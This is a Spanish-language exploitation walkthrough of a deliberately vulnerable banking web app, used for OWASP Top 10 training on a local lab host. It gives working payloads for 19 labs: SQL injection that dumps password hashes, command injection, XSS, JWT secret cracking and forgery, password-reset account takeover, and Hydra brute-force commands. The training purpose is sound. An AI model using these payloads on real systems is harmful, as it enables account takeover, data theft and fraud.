# Super Insecure Bank v1.0 — Walkthrough de Explotación

> [!WARNING]
> Esta guía contiene spoilers completos de los laboratorios.  
> Úsala únicamente en entornos locales, controlados y autorizados.

**Proyecto:** Super Insecure Bank v1.0  
**Aplicación:** banca web intencionalmente vulnerable  
**Objetivo:** practicar web hacking y OWASP Top 10:2025  
**Autor:** Fernando Conislla

---

## Convenciones usadas en esta guía

En los ejemplos se usará la siguiente URL base:

```text
http://192.168.1.122:5080
```

Reemplaza `192.168.1.122` por la IP del equipo donde está corriendo Docker.

Credenciales iniciales:

```text
Usuario:  fernando.conislla
Password: password1
```

En varios laboratorios se requiere iniciar sesión antes de ejecutar la petición vulnerable. Las peticiones se muestran en formato HTTP para que puedan reproducirse desde el navegador, DevTools, proxy HTTP o cualquier cliente de pruebas.


Se recomienda usar **Burp Suite** para interceptar, repetir y modificar las peticiones HTTP durante la explotación de los laboratorios.

---

# A01:2025 — Broken Access Control

## Lab 1 — Acceso a información de otra cuenta

### Enunciado

La aplicación permite a los usuarios del banco ver sus cuentas y transacciones.

¿Será posible consultar los movimientos de otros usuarios, como Alice en la cuenta 2002?

---

### Paso 1: Consultar una cuenta propia

Al ingresar a la sección de cuentas y consultar las transacciones de una cuenta propia, la aplicación genera una petición `GET` hacia el siguiente recurso:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions
```

La cuenta `1001` pertenece al usuario autenticado.

---

### Paso 2: Identificar el valor manipulable

El identificador de la cuenta forma parte de la URL:

```text
/api/accounts/1001/transactions
```

El valor manipulable es:

```text
1001
```

---

### Paso 3: Cambiar el identificador por una cuenta de Alice

Se reemplaza la cuenta propia por la cuenta `2002`, asociada a Alice:

```http
GET http://192.168.1.122:5080/api/accounts/2002/transactions
```

---

### Resultado esperado

La aplicación devuelve información de la cuenta `2002`, perteneciente a Alice:

```json
{
  "account": {
    "account_number": "2002",
    "account_type": "Checking",
    "balance": "8500.00",
    "currency": "USD",
    "owner_username": "alice.morrison",
    "owner_name": "Alice Morrison"
  }
}
```

---

### Conclusión

La aplicación permite acceder a información de una cuenta que no pertenece al usuario autenticado simplemente modificando el identificador en la URL.

Esto demuestra una falla de control de acceso, ya que el backend no valida correctamente que la cuenta solicitada pertenezca al usuario que realiza la petición.

---

## Lab 2 — Funcionalidad de préstamos oculta

### Enunciado

La sección de préstamos indica que este trámite debe realizarse de forma presencial.

¿Será posible solicitar un préstamo desde la aplicación?

---

### Paso 1: Acceder a la sección de préstamos

Desde el navegador, ingresar a la ruta:

```http
GET http://192.168.1.122:5080/loans
```

La interfaz indica que la solicitud de préstamos debe realizarse de forma presencial.

---

### Paso 2: Inspeccionar el código HTML

Abrir DevTools y buscar elementos ocultos relacionados con préstamos.

Puede encontrarse un formulario oculto similar a:

```html
<form id="loan-application-form" style="display:none;">
```

---

### Paso 3: Mostrar el formulario oculto

Modificar el atributo visual:

```html
style="display:none;"
```

por:

```html
style="display:block;"
```

El formulario queda visible en la interfaz.

---

### Paso 4: Enviar la solicitud al backend

La solicitud puede enviarse directamente al endpoint de préstamos:

```http
POST http://192.168.1.122:5080/api/loans/apply
Content-Type: application/json

{
  "account_id": "1001",
  "amount": "5000",
  "term_months": "24",
  "purpose": "Personal expenses"
}
```

---

### Resultado esperado

La aplicación acepta la solicitud de préstamo:

```json
{
  "message": "Loan application submitted successfully",
  "loan": {
    "status": "PRE_APPROVED"
  }
}
```

---

### Conclusión

La restricción de préstamos existe solo en la interfaz. Aunque el formulario está oculto, el backend continúa aceptando solicitudes.

Esto demuestra una falla de control de acceso y autorización, ya que la disponibilidad real de la funcionalidad no está controlada por el servidor.

---

## Lab 3 — Modificación de un dato sensible del perfil

### Enunciado

La aplicación permite al usuario modificar algunos datos de su perfil.

¿Será posible modificar el teléfono usado para recibir OTP?

---

### Paso 1: Actualizar datos normales del perfil

Al modificar el perfil desde la aplicación, se envía una petición similar a:

```http
POST http://192.168.1.122:5080/api/profile/kyc/update
Content-Type: application/json

{
  "address": "Av Principal 1234",
  "occupation": "Consultant",
  "monthly_income": "5000",
  "source_of_funds": "Salary"
}
```

---

### Paso 2: Identificar que el cuerpo JSON puede ser manipulado

La aplicación procesa campos enviados por el cliente dentro del cuerpo de la petición.

El usuario puede agregar campos que no aparecen en la interfaz.

---

### Paso 3: Agregar el campo sensible `otp_phone`

Se agrega manualmente el campo `otp_phone` a la petición:

```http
POST http://192.168.1.122:5080/api/profile/kyc/update
Content-Type: application/json

{
  "address": "Av Principal 1234",
  "occupation": "Consultant",
  "monthly_income": "5000",
  "source_of_funds": "Salary",
  "otp_phone": "+51 999 888 777"
}
```

---

### Resultado esperado

La aplicación acepta el campo adicional y actualiza el teléfono usado para OTP.

---

### Conclusión

La aplicación permite modificar un dato sensible que no debería estar disponible para edición directa.

Esto demuestra una falla de control de acceso a nivel de propiedades, ya que el backend acepta atributos no autorizados enviados por el cliente.

---

# A02:2025 — Security Misconfiguration

## Lab 4 — Información interna expuesta

### Enunciado

La aplicación cuenta con una ruta para consultar el estado del sistema.

¿Será posible acceder a información interna del banco sin iniciar sesión?

---

### Paso 1: Acceder a la ruta de estado

Desde el navegador o cliente HTTP, consultar:

```http
GET http://192.168.1.122:5080/status
```

---

### Paso 2: Verificar si requiere autenticación

Abrir la misma ruta en una ventana privada o sin haber iniciado sesión:

```http
GET http://192.168.1.122:5080/status
```

---

### Resultado esperado

La aplicación devuelve información interna del sistema:

```json
{
  "hostname": "sib-web-01",
  "environment": "development",
  "debug": true,
  "server": "Werkzeug/2.2.2",
  "python": "3.10.12",
  "warning": "Status endpoint exposed without authentication"
}
```

---

### Conclusión

La aplicación expone una ruta de diagnóstico sin autenticación.

Esto permite obtener información útil sobre el entorno, versiones, modo de ejecución y componentes internos.

---

## Lab 5 — Consola de diagnóstico expuesta

### Enunciado

La aplicación fue desplegada conservando una pantalla de diagnóstico.

¿Será posible encontrar una consola interna accesible desde el navegador?

---

### Paso 1: Acceder a la consola

Abrir la siguiente ruta:

```http
GET http://192.168.1.122:5080/console
```

---

### Paso 2: Revisar el contenido expuesto

La aplicación muestra una pantalla de diagnóstico simulada:

```text
Werkzeug Debugger Console
Console locked
```

---

### Resultado esperado

La consola aparece accesible desde el navegador, aunque debería ser una funcionalidad interna.

---

### Conclusión

La aplicación conserva una consola de diagnóstico expuesta.

Esto demuestra una mala configuración, ya que componentes internos de depuración no deberían estar disponibles en un entorno desplegado.

---

# A03:2025 — Software Supply Chain Failures

## Lab 6 — Componentes de terceros desactualizados

### Enunciado

La aplicación utiliza componentes de terceros para funcionar.

¿Tendrá componentes de terceros desactualizados o vulnerables?

---

### Paso 1: Revisar headers HTTP

Consultar una ruta de la aplicación y observar los headers de respuesta:

```http
GET http://192.168.1.122:5080/login
```

Buscar valores relacionados con tecnologías internas:

```text
Server
Werkzeug
Python
Flask
```

---

### Paso 2: Revisar la ruta de estado

Consultar el endpoint de estado:

```http
GET http://192.168.1.122:5080/status
```

---

### Resultado esperado

La aplicación revela componentes y versiones:

```json
{
  "server": "Werkzeug/2.2.2",
  "python": "3.10.12",
  "debug": true
}
```

---

### Conclusión

La aplicación revela detalles sobre componentes de terceros y versiones utilizadas.

Esto facilita el fingerprinting del stack y permite buscar vulnerabilidades conocidas asociadas a esas versiones.

---

# A04:2025 — Cryptographic Failures

## Lab 7 — Almacenamiento inseguro de contraseñas

### Enunciado

La aplicación almacena las contraseñas de los usuarios en una base de datos interna.

¿Será posible recuperar los valores originales de esas contraseñas?

---

### Paso 1: Extraer hashes mediante una vulnerabilidad previa

Usando la inyección SQL del Lab 10, se puede intentar extraer usuarios y hashes desde la tabla de usuarios.

Payload:

```sql
%' UNION SELECT 99999, username, username, password_hash, 1, 0, 'USD', email, 'APPROVED', '2026-06-24 00:00' FROM users--
```

La petición manipulada quedaría conceptualmente así:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions?search=%25%27%20UNION%20SELECT%2099999%2C%20username%2C%20username%2C%20password_hash%2C%201%2C%200%2C%20%27USD%27%2C%20email%2C%20%27APPROVED%27%2C%20%272026-06-24%2000%3A00%27%20FROM%20users--
```

---

### Paso 2: Identificar hashes MD5

Los hashes extraídos tienen formato similar a:

```text
7c6a180b36896a0a8c02787eeafb0e4c
```

Este formato es consistente con un hash MD5 hexadecimal.

---

### Paso 3: Guardar los hashes en un archivo

Crear el archivo:

```text
hashes.txt
```

Contenido de ejemplo:

```text
7c6a180b36896a0a8c02787eeafb0e4c
```

---

### Paso 4: Crackear los hashes con John

Ejecutar:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

Mostrar resultados:

```bash
john hashes.txt --show --format=Raw-MD5
```

---

### Resultado esperado

John recupera contraseñas débiles almacenadas como hashes MD5:

```text
password1
qwerty
letmein
football
monkey
dragon
abc123
123456
password
123456789
```

---

### Conclusión

La aplicación almacena contraseñas con un algoritmo débil y rápido.

Esto permite recuperar valores originales de contraseñas si los hashes son extraídos desde la base de datos.

---

## Lab 8 — Canal HTTPS con configuración débil

### Enunciado

La aplicación ofrece acceso mediante HTTPS para proteger la comunicación entre el usuario y el banco.

¿Será posible identificar si el canal cifrado utiliza configuraciones criptográficas débiles?

---

### Paso 1: Acceder al servicio HTTPS

Abrir la aplicación por HTTPS:

```http
GET https://192.168.1.122:5443/login
```

Es posible que el navegador muestre una advertencia por certificado autofirmado.

---

### Paso 2: Analizar la configuración TLS

Ejecutar:

```bash
sslscan 192.168.1.122:5443
```

También puede usarse Nmap:

```bash
nmap -sT --script ssl-enum-ciphers -p 5443 192.168.1.122
```

---

### Resultado esperado

Se identifican configuraciones débiles o no recomendadas, por ejemplo:

```text
Self-signed certificate
TLSv1.1 enabled
Weak cipher suites
```

---

### Conclusión

Aunque la aplicación ofrece HTTPS, la configuración criptográfica puede ser débil o inadecuada.

Esto demuestra que usar HTTPS no es suficiente si el canal no está configurado de forma segura.

---

## Lab 9 — Secreto débil para la generación de tokens

### Enunciado

La aplicación usa tokens para mantener la sesión del usuario autenticado.

¿Será posible crear un token válido para otro usuario?

---

### Paso 1: Obtener el JWT de sesión

Iniciar sesión y copiar el valor de la cookie de sesión:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "fernando.conislla",
  "password": "password1"
}
```

El token queda almacenado en una cookie similar a:

```text
access_token=<JWT>
```

---

### Paso 2: Guardar el JWT en un archivo

Crear el archivo:

```text
jwt.txt
```

Pegar dentro el JWT obtenido.

---

### Paso 3: Crackear el secreto con John

Ejecutar:

```bash
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

Mostrar el secreto recuperado:

```bash
john jwt.txt --show --format=HMAC-SHA256
```

---

### Resultado esperado

Se recupera el secreto de firma:

```text
trustno1
```

---

### Paso 4: Crear un token para Alice

Con el secreto recuperado, generar un JWT para otro usuario:

```bash
python3 - << 'PY'
import jwt

payload = {
    "sub": "alice.morrison",
    "username": "alice.morrison",
    "role": "customer"
}

token = jwt.encode(payload, "trustno1", algorithm="HS256")
print(token)
PY
```

---

### Paso 5: Usar el token forjado

Enviar una petición autenticada usando el token generado:

```http
GET http://192.168.1.122:5080/api/accounts
Cookie: access_token=<JWT_FORJADO>
```

---

### Conclusión

La aplicación usa un secreto débil para firmar tokens JWT.

Al recuperar ese secreto, es posible crear tokens válidos para otros usuarios y suplantar sesiones.

---

# A05:2025 — Injection

## Lab 10 — Inyección SQL en búsqueda de transacciones

### Enunciado

La aplicación permite buscar movimientos dentro de una cuenta bancaria.

¿Será posible manipular la búsqueda para obtener más información de la esperada?

---

### Paso 1: Ejecutar una búsqueda normal

Desde la sección de transacciones, realizar una búsqueda cualquiera.

La aplicación genera una petición similar a:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions?search=test
```

---

### Paso 2: Identificar el parámetro manipulable

El parámetro vulnerable es:

```text
search
```

---

### Paso 3: Probar una condición booleana

Modificar el parámetro con el siguiente payload:

```sql
%' OR 1=1-- 
```

La petición quedaría así:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions?search=%25%27%20OR%201%3D1--%20
```

---

### Resultado esperado

La aplicación devuelve más registros de los esperados.

---

### Paso 4: Enumerar tablas

Usar un payload con `UNION SELECT` contra `sqlite_master`:

```sql
%' UNION SELECT 99999, name, name, type, 1, 0, 'USD', sql, 'APPROVED', '2026-06-24 00:00' FROM sqlite_master WHERE type='table'--
```

---

### Paso 5: Extraer usuarios y hashes

Usar un payload contra la tabla `users`:

```sql
%' UNION SELECT 99999, username, username, password_hash, 1, 0, 'USD', email, 'APPROVED', '2026-06-24 00:00' FROM users--
```

---

### Conclusión

La aplicación concatena datos controlados por el usuario dentro de una consulta SQL.

Esto permite alterar la lógica de la consulta y extraer información fuera del alcance funcional previsto.

---

## Lab 11 — Command Injection en estados de cuenta

### Enunciado

La aplicación permite al usuario consultar sus estados de cuenta.

¿Será posible manipular esta funcionalidad para ejecutar comandos en el servidor?

---

### Paso 1: Abrir la sección de estados de cuenta

Ingresar a:

```http
GET http://192.168.1.122:5080/statements
```

---

### Paso 2: Cargar estados de cuenta normalmente

Hacer clic en el botón:

```text
Load statements
```

La aplicación genera una petición similar a:

```http
GET http://192.168.1.122:5080/api/statements/accounts/1001
```

---

### Paso 3: Modificar el atributo HTML del botón

Desde DevTools, ubicar el botón con el identificador de cuenta:

```html
<button class="btn primary load-statements" data-account="1001" onclick="loadStatementsFor(this)">
  Load statements
</button>
```

Cambiar:

```html
data-account="1001"
```

por:

```html
data-account="1001;whoami"
```

---

### Paso 4: Ejecutar nuevamente la funcionalidad

Hacer clic otra vez en:

```text
Load statements
```

La aplicación genera una petición manipulada:

```http
GET http://192.168.1.122:5080/api/statements/accounts/1001;whoami
```

---

### Resultado esperado

La interfaz muestra una salida anómala:

```text
Command output
root
```

o:

```text
Command output
www-data
```

---

### Conclusión

La aplicación usa un valor controlado por el usuario dentro de una operación ejecutada a nivel de sistema.

Esto permite inyectar comandos del sistema operativo desde una funcionalidad aparentemente legítima.

---

## Lab 12 — Cross-Site Scripting en recibos

### Enunciado

La aplicación permite escribir una nota o referencia al realizar una transferencia.

¿Será posible contaminar este campo para ejecutar código JavaScript arbitrario cuando se visualice el recibo?

---

### Paso 1: Crear una transferencia normal

Desde la funcionalidad de transferencias, enviar dinero a otra cuenta.

La aplicación procesa una petición similar a:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "note": "Dinner reimbursement"
}
```

---

### Paso 2: Identificar el campo manipulable

El campo usado como nota o referencia es:

```text
note
```

---

### Paso 3: Enviar un payload XSS

Modificar la nota con el siguiente payload:

```html
<img src=x onerror=alert(1)>
```

La petición quedaría así:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "note": "<img src=x onerror=alert(1)>"
}
```

Payload alternativo:

```html
<script>alert(1)</script>
```

---

### Paso 4: Visualizar el recibo generado

Abrir el recibo asociado a la transferencia desde la interfaz.

---

### Resultado esperado

El navegador ejecuta JavaScript al renderizar el recibo:

```javascript
alert(1)
```

---

### Conclusión

La aplicación refleja o almacena contenido controlado por el usuario sin codificarlo correctamente al mostrar el recibo.

Esto permite ejecución de JavaScript en el navegador de quien visualiza el comprobante.

---

# A06:2025 — Insecure Design

## Lab 13 — Diseño inadecuado en el cobro de comisiones

### Enunciado

La aplicación cobra una comisión por transferencias externas.

¿Será posible evitar el cobro de la comisión al ejecutar una transferencia externa?

---

### Paso 1: Realizar una transferencia externa pequeña

Enviar una transferencia externa por un monto muy bajo:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "3003",
  "amount": "0.49",
  "note": "microtransfer test"
}
```

---

### Paso 2: Revisar la comisión calculada

Observar la respuesta generada por la aplicación.

---

### Resultado esperado

La comisión se calcula como cero:

```json
{
  "transfer": {
    "amount": "0.49",
    "fee": "0.00",
    "total_debit": "0.49"
  }
}
```

---

### Paso 3: Repetir el patrón

Repetir varias transferencias pequeñas para observar que la regla de comisión puede ser evadida mediante fraccionamiento.

---

### Conclusión

La regla de negocio para comisiones fue diseñada de forma insuficiente.

Aunque existe una comisión porcentual, el redondeo permite evitar el cobro mediante microtransferencias.

---

# A07:2025 — Authentication Failures

## Lab 14 — Enumeración de usuarios

### Enunciado

La aplicación permite interactuar con distintos flujos donde se procesan nombres de usuario.

¿Será posible descubrir y validar nombres de usuario válidos en la aplicación?

---

### Paso 1: Revisar información pública

Abrir la sección social:

```http
GET http://192.168.1.122:5080/social
```

Identificar nombres de personas publicados por la aplicación:

```text
Fernando Conislla
Alice Morrison
Bob Wilson
Carla Bennett
Daniel Brooks
```

---

### Paso 2: Inferir el formato de usuario

Convertir los nombres al formato usado por la aplicación:

```text
nombre.apellido
```

Ejemplos:

```text
fernando.conislla
alice.morrison
bob.wilson
carla.bennett
daniel.brooks
```

---

### Paso 3: Validar usuarios mediante forgot password

Enviar una solicitud con un usuario existente:

```http
POST http://192.168.1.122:5080/api/forgot-password
Content-Type: application/json

{
  "username": "alice.morrison"
}
```

Enviar otra solicitud con un usuario inexistente:

```http
POST http://192.168.1.122:5080/api/forgot-password
Content-Type: application/json

{
  "username": "no.user"
}
```

---

### Resultado esperado

El usuario inexistente devuelve una respuesta diferente:

```json
{
  "error": "No account was found with that username."
}
```

---

### Conclusión

La aplicación permite diferenciar entre usuarios existentes e inexistentes.

Esto facilita construir una lista de usuarios válidos para ataques posteriores de fuerza bruta, phishing o abuso del flujo de recuperación de contraseña.

---

## Lab 15 — Restablecimiento de contraseña inseguro

### Enunciado

La aplicación permite restablecer contraseñas mediante un enlace enviado al correo del usuario.

¿Será posible cambiar la contraseña de otro usuario del sistema, por ejemplo Alice?

---

### Paso 1: Solicitar reset para Fernando

Enviar una solicitud de restablecimiento para el usuario propio:

```http
POST http://192.168.1.122:5080/api/forgot-password
Content-Type: application/json

{
  "username": "fernando.conislla"
}
```

---

### Paso 2: Abrir el buzón simulado

Consultar el mailbox del usuario:

```http
GET http://192.168.1.122:5080/mailbox?username=fernando.conislla
```

Copiar el token de restablecimiento recibido.

---

### Paso 3: Observar la petición de confirmación

La petición legítima para cambiar la contraseña del propio usuario sería:

```http
POST http://192.168.1.122:5080/api/reset-password/confirm
Content-Type: application/json

{
  "token": "<RESET_TOKEN_DE_FERNANDO>",
  "username": "fernando.conislla",
  "new_password": "password2"
}
```

---

### Paso 4: Cambiar el usuario objetivo a Alice

Modificar el campo `username` y mantener el mismo token:

```http
POST http://192.168.1.122:5080/api/reset-password/confirm
Content-Type: application/json

{
  "token": "<RESET_TOKEN_DE_FERNANDO>",
  "username": "alice.morrison",
  "new_password": "AliceNew123"
}
```

---

### Paso 5: Iniciar sesión como Alice

Probar las nuevas credenciales:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "alice.morrison",
  "password": "AliceNew123"
}
```

---

### Resultado esperado

La aplicación permite iniciar sesión como Alice usando la nueva contraseña.

---

### Conclusión

El token de restablecimiento no está correctamente vinculado al usuario para el que fue emitido.

Esto permite usar un token válido de un usuario para cambiar la contraseña de otro.

---

## Lab 16 — Login con defensa insuficiente y contraseñas débiles

### Enunciado

El formulario de login permite intentar diferentes combinaciones de usuario y contraseña.

¿Será posible identificar contraseñas válidas de los usuarios de la aplicación?

---

### Paso 1: Identificar el endpoint de login

El formulario envía credenciales al siguiente recurso:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "fernando.conislla",
  "password": "password1"
}
```

---

### Paso 2: Observar la diferencia entre éxito y fallo

La aplicación responde con HTTP `200` tanto para credenciales válidas como inválidas.

La diferencia se encuentra en el cuerpo de la respuesta:

```text
Éxito: Login successful
Fallo: Invalid username or password
```

---

### Paso 3: Crear una lista de usuarios

Ejemplo:

```text
fernando.conislla
alice.morrison
bob.wilson
carla.bennett
daniel.brooks
alonso.conislla
emily.carter
james.howard
olivia.martin
william.scott
```

Guardar como:

```text
users.txt
```

---

### Paso 4: Ejecutar Hydra contra HTTP

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.122 -s 5080 http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^"}:S=Login successful:H=Content-Type\: application/json' -V -I
```

---

### Paso 5: Ejecutar Hydra contra HTTPS

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.122 -s 5443 https-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^"}:S=Login successful:H=Content-Type\: application/json' -V -I
```

---

### Resultado esperado

Hydra identifica credenciales válidas:

```text
alice.morrison:qwerty
bob.wilson:letmein
carla.bennett:football
daniel.brooks:monkey
```

---

### Conclusión

El login permite ataques automatizados contra múltiples usuarios y contraseñas.

Esto demuestra ausencia de controles efectivos contra fuerza bruta, además del uso de contraseñas débiles.

---

# A08:2025 — Software or Data Integrity Failures

## Lab 17 — Recibo con datos manipulados

### Enunciado

La aplicación genera un recibo después de realizar una transferencia.

¿Será posible generar recibos inconsistentes respecto a las transacciones reales?

---

### Paso 1: Realizar una transferencia real

Enviar una transferencia de bajo monto:

```http
POST http://192.168.1.122:5080/api/transfers/create
Content-Type: application/json

{
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "note": "integrity test"
}
```

Copiar el identificador de transferencia devuelto por la aplicación.

---

### Paso 2: Generar un recibo legítimo

La aplicación genera el recibo usando datos enviados por el cliente:

```http
POST http://192.168.1.122:5080/api/receipts/generate
Content-Type: application/json

{
  "transfer_id": "T9248",
  "from_account": "1001",
  "to_account": "2002",
  "amount": "1.00",
  "currency": "USD",
  "status": "APPROVED",
  "payment_reference": "integrity test"
}
```

---

### Paso 3: Manipular el monto del recibo

Cambiar el monto enviado al generador del recibo:

```http
POST http://192.168.1.122:5080/api/receipts/generate
Content-Type: application/json

{
  "transfer_id": "T9248",
  "from_account": "1001",
  "to_account": "2002",
  "amount": "9999.00",
  "currency": "USD",
  "status": "APPROVED",
  "payment_reference": "integrity test"
}
```

---

### Resultado esperado

El recibo muestra un monto distinto al de la transacción real:

```text
Monto real transferido: 1.00 USD
Monto mostrado en recibo: 9999.00 USD
```

---

### Conclusión

La aplicación genera comprobantes confiando en datos enviados por el cliente.

Esto permite crear recibos inconsistentes respecto a la operación realmente registrada.

---

# A09:2025 — Security Logging and Alerting Failures

## Lab 18 — Logs de seguridad que exponen demasiada información

### Enunciado

La aplicación registra eventos relacionados con autenticación y actividad sospechosa.

¿Será posible identificar información excesiva o sensible almacenada en los logs?

---

### Paso 1: Generar eventos de autenticación

Ejecutar un intento de login fallido:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "alice.morrison",
  "password": "wrongpass"
}
```

Luego realizar un login exitoso:

```http
POST http://192.168.1.122:5080/api/login
Content-Type: application/json

{
  "username": "fernando.conislla",
  "password": "password1"
}
```

---

### Paso 2: Consultar los logs de seguridad

Abrir el dashboard de seguridad:

```http
GET http://192.168.1.122:5080/security-dashboard
```

También puede consultarse el endpoint de logs:

```http
GET http://192.168.1.122:5080/api/security-logs
```

---

### Resultado esperado

Los logs muestran información excesiva o sensible:

```text
LOGIN_FAILED user=alice.morrison password=wrongpass
LOGIN_SUCCESS user=fernando.conislla jwt=<JWT_COMPLETO>
```

---

### Paso 3: Identificar acciones peligrosas adicionales

La aplicación permite limpiar logs desde un endpoint:

```http
POST http://192.168.1.122:5080/api/security-logs/clear
```

---

### Conclusión

La aplicación registra información sensible como contraseñas o tokens.

Además, la posibilidad de limpiar logs afecta la trazabilidad y reduce la capacidad de investigación posterior.

---

# A10:2025 — Mishandling of Exceptional Conditions

## Lab 19 — Manejo inadecuado de errores en consulta de transacciones

### Enunciado

La aplicación recibe identificadores de cuenta para consultar transacciones.

¿Será posible provocar un error que revele detalles internos del sistema?

---

### Paso 1: Consultar transacciones con un identificador válido

La aplicación normalmente consulta transacciones con un identificador numérico:

```http
GET http://192.168.1.122:5080/api/accounts/1001/transactions
```

---

### Paso 2: Enviar un identificador inválido

Cambiar el identificador numérico por texto:

```http
GET http://192.168.1.122:5080/api/accounts/abc/transactions
```

---

### Resultado esperado

La aplicación devuelve un error técnico con detalles internos:

```json
{
  "error": "Invalid account identifier",
  "stacktrace": "...",
  "query": "...",
  "database": "sqlite:///..."
}
```

---

### Conclusión

La aplicación no maneja adecuadamente condiciones excepcionales generadas por entradas inválidas.

Esto provoca exposición de stacktraces, consultas, rutas internas o detalles de implementación que pueden facilitar ataques posteriores.

---

# Cierre

Este walkthrough demuestra cómo los 19 laboratorios de Super Insecure Bank v1.0 pueden ser explotados de forma práctica y reproducible.

El objetivo de la guía es facilitar el aprendizaje técnico de OWASP Top 10:2025 mediante escenarios realistas dentro de una aplicación bancaria vulnerable.
